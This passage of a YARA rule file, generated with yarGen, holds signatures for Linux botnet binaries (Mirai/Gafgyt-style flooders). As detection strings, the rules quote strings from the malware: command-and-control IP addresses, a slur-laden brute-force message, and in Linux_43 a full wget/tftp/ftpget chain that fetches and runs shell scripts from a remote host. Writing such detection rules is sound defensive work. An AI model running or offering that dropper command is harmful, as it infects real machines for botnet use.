      $op2 = { ef 80 00 bd e8 1e ff 2f e1 80 40 2d e9 bf 70 a0 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_36 {
   meta:
      description = "Linux_36"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f0d62aec4a2a5353a6416bbd403969fc0617d08aeb8eb9e09de4d4068a2fd9f3"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s2 = "hoste.6548" fullword ascii
      $s3 = "u/etc/hosts" fullword ascii
      $s4 = "__sys_recvmsg" fullword ascii
      $s5 = "resolv_conf_mtime.6591" fullword ascii
      $s6 = "last_ns_num.6605" fullword ascii
      $s7 = "buf_size.5899" fullword ascii
      $s8 = "xdigits.4932" fullword ascii
      $s9 = "last_id.6606" fullword ascii
      $s10 = "buf.4507" fullword ascii
      $s11 = "i.4743" fullword ascii
      $s12 = "buf.6549" fullword ascii

      $op0 = { dc ff ff ff dc ff ff ff 94 6a 00 00 dc ff ff ff }
      $op1 = { f0 4f 2d e9 08 54 9f e5 08 34 9f e5 05 50 8f e0 }
      $op2 = { ef 00 00 55 e3 0c 00 a0 03 00 00 a0 13 04 d0 8d }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_37 {
   meta:
      description = "Linux_37"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "588839fc5f65c5bf7e17cdfce5fc8ce371d240924cba03cc8ecb08f5e85ccbc1"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii
      $s5 = "Unable to process REL relocs" fullword ascii
      $s6 = "%s():%i: %s: usage count: %d" fullword ascii
      $s7 = "%s():%i: Lib: %s already opened" fullword ascii
      $s8 = "%s():%i: running ctors for library %s at '%p'" fullword ascii
      $s9 = "%s():%i: running dtors for library %s at '%p'" fullword ascii
      $s10 = "%s():%i: __address: %p  __info: %p" fullword ascii
      $s11 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */
      $s12 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */
      $s13 = "////////////," fullword ascii /* reversed goodware string ',////////////' */
      $s14 = "searching RUNPATH='%s'" fullword ascii
      $s15 = "%s:%i: RELRO protecting %s:  start:%x, end:%x" fullword ascii
      $s16 = "%s():%i: Move %s from pos %d to %d in INIT/FINI list." fullword ascii
      $s17 = "%s:%i: Bummer: could not find '%s'!" fullword ascii
      $s18 = "%s():%i: Trying to load '%s', needed by '%s'" fullword ascii
      $s19 = "%s: '%s' has more than one dynamic section" fullword ascii
      $s20 = "%s():%i: removing loaded_modules: %s" fullword ascii

      $op0 = { 4b 7a ca 20 82 0f 02 00 34 8e e2 20 82 0f }
      $op1 = { 0e ea cf 71 02 00 58 c2 cf 70 02 00 34 8e f1 c0 }
      $op2 = { cf 70 02 00 44 cd 01 80 0b 78 e0 7c f1 c0 fc 1c }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_38 {
   meta:
      description = "Linux_38"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "11a268e56021ba5ceba480cfe3bc057e4a699e8bb514a7420d6dbd36563f15b2"
   strings:
      $s1 = "KM^_`abcdefghijk" fullword ascii

      $op0 = { 80 a5 a0 00 12 bf ff 94 d0 34 a0 02 40 00 13 96 }
      $op1 = { 80 a5 60 00 12 bf ff ad d0 34 60 02 40 00 12 33 }
      $op2 = { 83 35 e0 10 80 a0 40 1a 12 bf ff ce d0 34 20 04 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( all of them and all of ($op*) )
}

rule Linux_39 {
   meta:
      description = "Linux_39"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "86db1be708217e5592c2df552f51bd1d2e0edb0e51863691e7cd86872545b06a"
   strings:
      $s1 = "KM^_`abcdefghijk" fullword ascii

      $op0 = { 80 a5 a0 00 12 bf ff 94 d0 34 a0 02 40 00 13 96 }
      $op1 = { 80 a5 60 00 12 bf ff ad d0 34 60 02 40 00 12 33 }
      $op2 = { 83 35 e0 10 80 a0 40 1a 12 bf ff ce d0 34 20 04 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( all of them and all of ($op*) )
}

rule Linux_40 {
   meta:
      description = "Linux_40"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8a52dbe6e5aee4ba35c1e9042708cabcb70d53d4c811695e3a2ad174cc1aa12b"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "get_cmdline" fullword ascii
      $s4 = "commandparsing" fullword ascii
      $s5 = "cmdlinekillstrings" fullword ascii
      $s6 = "decodedshit" fullword ascii
      $s7 = "connecthosts" fullword ascii
      $s8 = "killer_cmdlinelol" fullword ascii
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s10 = "cmdparse" fullword ascii
      $s11 = "pathread" fullword ascii
      $s12 = "remoteaddr" fullword ascii
      $s13 = "Sending requests to: %s:%d " fullword ascii
      $s14 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s15 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s16 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s17 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s18 = "attackpids" fullword ascii
      $s19 = "whitlistpaths" fullword ascii
      $s20 = "estring" fullword ascii

      $op0 = { c6 26 20 20 82 10 60 34 c2 05 c0 01 88 00 7f ff }
      $op1 = { 82 10 60 34 c4 05 c0 01 03 }
      $op2 = { 82 10 60 e8 c2 05 c0 01 82 00 60 34 c4 00 60 08 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_41 {
   meta:
      description = "Linux_41"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1397837534d497bd6fac944f9a9e001d2b0aa462685c3b4377fa46a791f697cd"
   strings:
      $s1 = "udpplain_flood" fullword ascii
      $s2 = "get_random_ip" fullword ascii
      $s3 = "read_elf" fullword ascii
      $s4 = "completed.2170" fullword ascii
      $s5 = "report_working" fullword ascii
      $s6 = "consume_pass_prompt" fullword ascii
      $s7 = "random_auth_entry" fullword ascii
      $s8 = "consume_user_prompt" fullword ascii
      $s9 = "tcp_flood" fullword ascii
      $s10 = "84.54.51.37" fullword ascii
      $s11 = "udp_flood" fullword ascii
      $s12 = "__syscall_getdents64" fullword ascii
      $s13 = "addpid" fullword ascii
      $s14 = "scanner_kill" fullword ascii
      $s15 = "__heap_add_free_area" fullword ascii
      $s16 = "machine_to_str" fullword ascii
      $s17 = "ascii_X86" fullword ascii
      $s18 = "add_strings" fullword ascii
      $s19 = "] Arch: [" fullword ascii
      $s20 = "_wordcopy_fwd_dest_aligned" fullword ascii

      $op0 = { 4e 56 00 00 4a 39 80 00 be 60 66 3e 22 79 80 00 }
      $op1 = { 4a 88 67 0a 48 79 80 00 9a e4 4e 90 58 8f 13 fc }
      $op2 = { 4a 88 67 10 48 79 80 00 be 62 48 79 80 00 9a e4 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_42 {
   meta:
      description = "Linux_42"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "51efc8f2b51f1f3c5083056f96a9de6338ab1fc1909e64b4b685744d0eb43a9e"
   strings:
      $s1 = "__stdio_mutex_initializer.3828" fullword ascii
      $s2 = "[0;97m ] Connected -> " fullword ascii
      $s3 = "Nigger Bruted -> %s [ %s:%s ]" fullword ascii
      $s4 = "completed.2170" fullword ascii
      $s5 = "94.156.64.143:9821" fullword ascii
      $s6 = "__heap_add_free_area" fullword ascii
      $s7 = "_wordcopy_fwd_dest_aligned" fullword ascii
      $s8 = "been_there_done_that.2790" fullword ascii
      $s9 = "_wordcopy_bwd_dest_aligned" fullword ascii
      $s10 = "libc/sysdeps/linux/m68k/crtn.S" fullword ascii
      $s11 = "libc/sysdeps/linux/m68k/crt1.S" fullword ascii
      $s12 = "libc/sysdeps/linux/m68k/crti.S" fullword ascii
      $s13 = "object.2251" fullword ascii
      $s14 = "__free_to_heap" fullword ascii
      $s15 = "have_current_got" fullword ascii
      $s16 = "__malloc_from_heap" fullword ascii
      $s17 = "_wordcopy_fwd_aligned" fullword ascii
      $s18 = "_wordcopy_bwd_aligned" fullword ascii
      $s19 = "__heap_free_area_alloc" fullword ascii
      $s20 = "__heap_delete" fullword ascii

      $op0 = { ff 2f 00 61 ff ff ff a8 3a 58 8f 24 00 20 6e 00 }
      $op1 = { ff 2f 00 61 ff ff ff a8 20 58 8f 22 02 92 80 2d }
      $op2 = { 0c 4f ef 00 10 4e 5e 4e 75 4e 56 ff e0 2d 6e 00 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_43 {
   meta:
      description = "Linux_43"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "97c270704988507f66d1974e745bb63443b2e3a1a0142baa5f118dcbfa499890"
   strings:
      $x1 = "JN^Nucd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tft" ascii
      $s2 = "JN^Nucd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tft" ascii
      $s3 = "p 91.92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2." ascii
      $s4 = "sh; ftpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh" ascii
      $s5 = "REPORT %s:%s:%s" fullword ascii
      $s6 = "__stdio_mutex_initializer.3828" fullword ascii
      $s7 = "infectline" fullword ascii
      $s8 = "getRandomPublicIP" fullword ascii
      $s9 = "GETLOCALIP" fullword ascii
      $s10 = "PROBING" fullword ascii
      $s11 = "getBogos" fullword ascii
      $s12 = "getCores" fullword ascii
      $s13 = "/usr/sbin/dropbear" fullword ascii
      $s14 = "zprintf" fullword ascii
      $s15 = "hextable" fullword ascii
      $s16 = "fdpclose" fullword ascii
      $s17 = "fdpopen" fullword ascii
      $s18 = "completed.2170" fullword ascii
      $s19 = "__GI_pipe" fullword ascii
      $s20 = "sendHTTP" fullword ascii

      $op0 = { 0c 4f ef 00 10 4e 5e 4e 75 4e 56 ff e0 2d 6e 00 }
      $op1 = { ae 50 8f 4a 80 6d 00 00 82 2f 2e 00 14 41 ee ff }
      $op2 = { ff 2d 40 ff f4 42 80 2d 40 ff f0 22 2e ff f0 24 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_44 {
   meta:
      description = "Linux_44"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "643f08ad224269aed8e7895c0191bb72518e8624a8669b6302ca3d92ac5c3368"
   strings:
      $s1 = "__stdio_mutex_initializer.3828" fullword ascii
      $s2 = "completed.2170" fullword ascii
      $s3 = "__heap_add_free_area" fullword ascii
      $s4 = "_wordcopy_fwd_dest_aligned" fullword ascii
      $s5 = "been_there_done_that.2790" fullword ascii
      $s6 = "_wordcopy_bwd_dest_aligned" fullword ascii
      $s7 = "libc/sysdeps/linux/m68k/crtn.S" fullword ascii
      $s8 = "libc/sysdeps/linux/m68k/crt1.S" fullword ascii
      $s9 = "libc/sysdeps/linux/m68k/crti.S" fullword ascii
      $s10 = "object.2251" fullword ascii
      $s11 = "__free_to_heap" fullword ascii
      $s12 = "have_current_got" fullword ascii
      $s13 = "__malloc_from_heap" fullword ascii
      $s14 = "_wordcopy_fwd_aligned" fullword ascii
      $s15 = "_wordcopy_bwd_aligned" fullword ascii
      $s16 = "__heap_free_area_alloc" fullword ascii
      $s17 = "__heap_delete" fullword ascii
      $s18 = "__check_suid" fullword ascii
      $s19 = "prefix.4042" fullword ascii
      $s20 = "libc/sysdeps/linux/m68k/vfork.S" fullword ascii

      $op0 = { 20 11 40 00 0d 61 ff ff ff d9 64 30 00 20 6e ff }
      $op1 = { 02 11 40 00 0d 61 ff ff ff af d8 30 00 20 6e ff }
      $op2 = { ff 2d 40 ff 34 70 01 b0 ae ff 34 67 00 01 1e 72 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_45 {
   meta:
      description = "Linux_45"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c5c5328917f5af36c486187574156b90cdeae273523068dac062837fbd1108d3"
   strings:
      $s1 = "__stdio_mutex_initializer.3828" fullword ascii
      $s2 = "completed.2170" fullword ascii
      $s3 = "__heap_add_free_area" fullword ascii
      $s4 = "_wordcopy_fwd_dest_aligned" fullword ascii
      $s5 = "been_there_done_that.2790" fullword ascii
      $s6 = "_wordcopy_bwd_dest_aligned" fullword ascii
      $s7 = "libc/sysdeps/linux/m68k/crtn.S" fullword ascii
      $s8 = "libc/sysdeps/linux/m68k/crt1.S" fullword ascii
      $s9 = "libc/sysdeps/linux/m68k/crti.S" fullword ascii
      $s10 = "object.2251" fullword ascii
      $s11 = "__free_to_heap" fullword ascii
      $s12 = "have_current_got" fullword ascii
      $s13 = "__malloc_from_heap" fullword ascii
      $s14 = "_wordcopy_fwd_aligned" fullword ascii
      $s15 = "_wordcopy_bwd_aligned" fullword ascii
      $s16 = "__heap_free_area_alloc" fullword ascii
      $s17 = "__heap_delete" fullword ascii
      $s18 = "__check_suid" fullword ascii
      $s19 = "prefix.4042" fullword ascii
      $s20 = "libc/sysdeps/linux/m68k/vfork.S" fullword ascii

      $op0 = { ff 2f 00 61 ff ff ff a8 3a 58 8f 24 00 20 6e 00 }
      $op1 = { ff 2f 00 61 ff ff ff a8 20 58 8f 22 02 92 80 2d }
      $op2 = { 0c 4f ef 00 10 4e 5e 4e 75 4e 56 ff e0 2d 6e 00 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_46 {
   meta:
      description = "Linux_46"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "18437aee12ed64359bdff62b2a5d50a8188dd04bf7b4fb4f1d3197297aefa048"
   strings:
      $s1 = "udpplain_flood" fullword ascii
      $s2 = "get_random_ip" fullword ascii
      $s3 = "__get_pc_thunk_bx" fullword ascii
      $s4 = "read_elf" fullword ascii
      $s5 = "report_working" fullword ascii
      $s6 = "consume_pass_prompt" fullword ascii
      $s7 = "random_auth_entry" fullword ascii
      $s8 = "consume_user_prompt" fullword ascii
      $s9 = "completed.2429" fullword ascii
      $s10 = "tcp_flood" fullword ascii
      $s11 = "84.54.51.37" fullword ascii
      $s12 = "udp_flood" fullword ascii
      $s13 = "addpid" fullword ascii
      $s14 = "scanner_kill" fullword ascii
      $s15 = "machine_to_str" fullword ascii
      $s16 = "ascii_X86" fullword ascii
      $s17 = "add_strings" fullword ascii
      $s18 = "] Arch: [" fullword ascii
      $s19 = "ascii_killme" fullword ascii
      $s20 = "recv_strip_null" fullword ascii

      $op0 = { c7 44 24 04 14 18 05 08 c7 04 24 34 14 05 08 e8 }
      $op1 = { eb 34 8b 45 fc 03 45 08 0f b6 10 8b 45 f8 03 45 }
      $op2 = { 8d 85 d7 fc ff ff b9 ff ff ff ff 89 85 b4 fc ff }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_47 {
   meta:
      description = "Linux_47"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "37360f6da31b73b04cfef519dc71f25dbb1a7ffd1014c78bf0152099e08add72"
   strings:
      $s1 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii
      $s2 = "udpplain_flood" fullword ascii
      $s3 = "get_random_ip" fullword ascii
      $s4 = "read_elf" fullword ascii
      $s5 = "report_working" fullword ascii
      $s6 = "consume_pass_prompt" fullword ascii
      $s7 = "random_auth_entry" fullword ascii
      $s8 = "consume_user_prompt" fullword ascii
      $s9 = "completed.2217" fullword ascii
      $s10 = "tcp_flood" fullword ascii
      $s11 = "84.54.51.37" fullword ascii
      $s12 = "udp_flood" fullword ascii
      $s13 = "addpid" fullword ascii
      $s14 = "scanner_kill" fullword ascii
      $s15 = "machine_to_str" fullword ascii
      $s16 = "ascii_X86" fullword ascii
      $s17 = "add_strings" fullword ascii
      $s18 = "] Arch: [" fullword ascii
      $s19 = "ascii_killme" fullword ascii
      $s20 = "recv_strip_null" fullword ascii

      $op0 = { 86 2f 96 2f a6 2f 63 6a b6 2f 73 6b c6 2f 53 6c }
      $op1 = { c8 94 40 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
      $op2 = { c8 94 40 00 48 98 41 00 dc 94 41 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_48 {
   meta:
      description = "Linux_48"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4ab520a0fe086092930b24b9194d0d9af29d24b155613c04fa82db2607cf7b05"
   strings:
      $s1 = "__stdio_mutex_initializer.4636" fullword ascii
      $s2 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/landley/work/ab7/build/temp-armv6l/build-gcc/gcc" fullword ascii
      $s4 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii
      $s5 = "udpplain_flood" fullword ascii
      $s6 = "get_random_ip" fullword ascii
      $s7 = "read_elf" fullword ascii
      $s8 = "report_working" fullword ascii
      $s9 = "consume_pass_prompt" fullword ascii
      $s10 = "random_auth_entry" fullword ascii
      $s11 = "consume_user_prompt" fullword ascii
      $s12 = "completed.4959" fullword ascii
      $s13 = "tcp_flood" fullword ascii
      $s14 = "84.54.51.37" fullword ascii
      $s15 = "udp_flood" fullword ascii
      $s16 = "addpid" fullword ascii
      $s17 = "scanner_kill" fullword ascii
      $s18 = "machine_to_str" fullword ascii
      $s19 = "ascii_X86" fullword ascii
      $s20 = "add_strings" fullword ascii

      $op0 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f }
      $op1 = { f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 a0 73 e2 }
      $op2 = { d0 01 00 34 d4 01 00 0c d0 01 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_49 {
   meta:
      description = "Linux_49"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "62e20f728643713a03eed83e7b435a68952218c4a14bfd16d0cd5d4ef3952956"
   strings:
      $s1 = "udpplain_flood" fullword ascii
      $s2 = "get_random_ip" fullword ascii
      $s3 = "read_elf" fullword ascii
      $s4 = "report_working" fullword ascii
      $s5 = "consume_pass_prompt" fullword ascii
      $s6 = "random_auth_entry" fullword ascii
      $s7 = "consume_user_prompt" fullword ascii
      $s8 = "completed.3069" fullword ascii
      $s9 = "tcp_flood" fullword ascii
      $s10 = "84.54.51.37" fullword ascii
      $s11 = "udp_flood" fullword ascii
      $s12 = "addpid" fullword ascii
      $s13 = "scanner_kill" fullword ascii
      $s14 = " /lib/" fullword ascii
      $s15 = "machine_to_str" fullword ascii
      $s16 = "ascii_X86" fullword ascii
      $s17 = "add_strings" fullword ascii
      $s18 = "] Arch: [" fullword ascii
      $s19 = "ascii_killme" fullword ascii
      $s20 = "recv_strip_null" fullword ascii

      $op0 = { 90 1f 00 10 48 00 00 34 81 3f 00 08 a0 09 00 00 }
      $op1 = { 90 1f 00 0c 80 1f 00 34 90 1f 00 08 48 00 00 38 }
      $op2 = { 90 09 00 0c 80 1f 00 74 54 09 28 34 55 20 18 38 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_50 {
   meta:
      description = "Linux_50"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "69bbcb2d4057e29b4a171ffd3efc33cf47514424e395b25d6089d018f2e655e4"
   strings:
      $s1 = "udpplain_flood" fullword ascii
      $s2 = "get_random_ip" fullword ascii
      $s3 = "read_elf" fullword ascii
      $s4 = "report_working" fullword ascii
      $s5 = "consume_pass_prompt" fullword ascii
      $s6 = "random_auth_entry" fullword ascii
      $s7 = "consume_user_prompt" fullword ascii
      $s8 = "completed.2296" fullword ascii
      $s9 = "tcp_flood" fullword ascii
      $s10 = "84.54.51.37" fullword ascii
      $s11 = "udp_flood" fullword ascii
      $s12 = "addpid" fullword ascii
      $s13 = "scanner_kill" fullword ascii
      $s14 = "machine_to_str" fullword ascii
      $s15 = "ascii_X86" fullword ascii
      $s16 = "add_strings" fullword ascii
      $s17 = "] Arch: [" fullword ascii
      $s18 = "ascii_killme" fullword ascii
      $s19 = "recv_strip_null" fullword ascii
      $s20 = "ascii_Corona" fullword ascii

      $op0 = { 24 59 15 34 03 20 f8 09 }
      $op1 = { af c2 00 34 8f c2 00 34 }
      $op2 = { a4 43 00 0a 8f c3 00 34 27 c2 00 58 af a2 00 10 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_51 {
   meta:
      description = "Linux_51"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7e2f228acb6a0f3fb559a30bba1e3771505817251f3e57b2d9ce0ddf7b9956dd"
   strings:
      $s1 = "udpplain_flood" fullword ascii
      $s2 = "get_random_ip" fullword ascii
      $s3 = "read_elf" fullword ascii
      $s4 = "report_working" fullword ascii
      $s5 = "consume_pass_prompt" fullword ascii
      $s6 = "random_auth_entry" fullword ascii
      $s7 = "consume_user_prompt" fullword ascii
      $s8 = "completed.2248" fullword ascii
      $s9 = "tcp_flood" fullword ascii
      $s10 = "84.54.51.37" fullword ascii
      $s11 = "udp_flood" fullword ascii
      $s12 = "addpid" fullword ascii
      $s13 = "scanner_kill" fullword ascii
      $s14 = "machine_to_str" fullword ascii
      $s15 = "ascii_X86" fullword ascii
      $s16 = "add_strings" fullword ascii
      $s17 = "] Arch: [" fullword ascii
      $s18 = "ascii_killme" fullword ascii
      $s19 = "recv_strip_null" fullword ascii
      $s20 = "ascii_Corona" fullword ascii

      $op0 = { c0 27 bf ec 10 80 00 34 01 }
      $op1 = { 9d e3 bf 78 40 00 18 34 01 }
      $op2 = { 9d e3 bf 98 82 10 20 93 90 10 00 18 92 10 00 19 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_52 {
   meta:
      description = "Linux_52"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "bccf92f5eaf9adf3fb20779682ab20c816ffbce7133c95a623a95c3f0f5c40f0"
   strings:
      $s1 = "udpplain_flood" fullword ascii
      $s2 = "get_random_ip" fullword ascii
      $s3 = "__get_pc_thunk_bx" fullword ascii
      $s4 = "read_elf" fullword ascii
      $s5 = "report_working" fullword ascii
      $s6 = "consume_pass_prompt" fullword ascii
      $s7 = "random_auth_entry" fullword ascii
      $s8 = "consume_user_prompt" fullword ascii
      $s9 = "completed.2429" fullword ascii
      $s10 = "tcp_flood" fullword ascii
      $s11 = "84.54.51.37" fullword ascii
      $s12 = "udp_flood" fullword ascii
      $s13 = "addpid" fullword ascii
      $s14 = "scanner_kill" fullword ascii
      $s15 = "machine_to_str" fullword ascii
      $s16 = "ascii_X86" fullword ascii
      $s17 = "add_strings" fullword ascii
      $s18 = "] Arch: [" fullword ascii
      $s19 = "ascii_killme" fullword ascii
      $s20 = "recv_strip_null" fullword ascii

      $op0 = { 8d 85 d7 fc ff ff b9 ff ff ff ff 89 85 b4 fc ff }
      $op1 = { 8b 45 14 3b 45 0c 7e 09 c7 45 ec ff ff ff ff eb }
      $op2 = { eb 02 31 ed 43 89 cf f7 c6 ef ff ff ff 75 24 83 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_53 {
   meta:
      description = "Linux_53"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e73bbef9c7fcaf610c858be52a375b517bc62fd7e05dd867f928cd353536de16"
   strings:
      $s1 = "nprocessors_conf" fullword ascii
      $s2 = "__stdio_mutex_initializer.4484" fullword ascii
      $s3 = "addrconfig" fullword ascii
      $s4 = "hoste.5402" fullword ascii
      $s5 = "bb_get_chunk_with_continuation" fullword ascii
      $s6 = "completed.4531" fullword ascii
      $s7 = "__syscall_getdents64" fullword ascii
      $s8 = "_wordcopy_fwd_dest_aligned" fullword ascii
      $s9 = "_wordcopy_bwd_dest_aligned" fullword ascii
      $s10 = "have_current_got" fullword ascii
      $s11 = "_wordcopy_fwd_aligned" fullword ascii
      $s12 = "_wordcopy_bwd_aligned" fullword ascii
      $s13 = "__check_suid" fullword ascii
      $s14 = "inet_pton6" fullword ascii
      $s15 = "inet_ntop6" fullword ascii
      $s16 = "_is_equal_or_bigger_arg" fullword ascii
      $s17 = "?/proc/stat" fullword ascii
      $s18 = "unknown.1327" fullword ascii
      $s19 = "spec_base.4706" fullword ascii
      $s20 = "resolv_conf_mtime.5444" fullword ascii

      $op0 = { ff ff bc 62 00 00 ca 70 34 d0 ae ff b8 b0 ae ff }
      $op1 = { ff ff bc 63 00 01 6e 72 34 d2 ae ff b8 20 2e ff }
      $op2 = { ff 22 2e 00 14 52 81 2f 00 2f 01 61 ff ff ff 89 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_54 {
   meta:
      description = "Linux_54"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f22d7a0f934380778ed19c3b80f0e7fd8429a14a859ceaeb79edee9a1f242b01"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s4 = "Sending requests to: %s:%d " fullword ascii
      $s5 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s9 = "139.59.88.74" fullword ascii
      $s10 = "?/proc/stat" fullword ascii
      $s11 = "2surf2vhoi2h{h" fullword ascii
      $s12 = "arch %s" fullword ascii
      $s13 = "\\N^NuNV" fullword ascii
      $s14 = "\\N^Nu/" fullword ascii
      $s15 = "B@HAH@(" fullword ascii
      $s16 = "xN^NuNV" fullword ascii
      $s17 = "p[N@-@" fullword ascii
      $s18 = "  @N^NuNV" fullword ascii
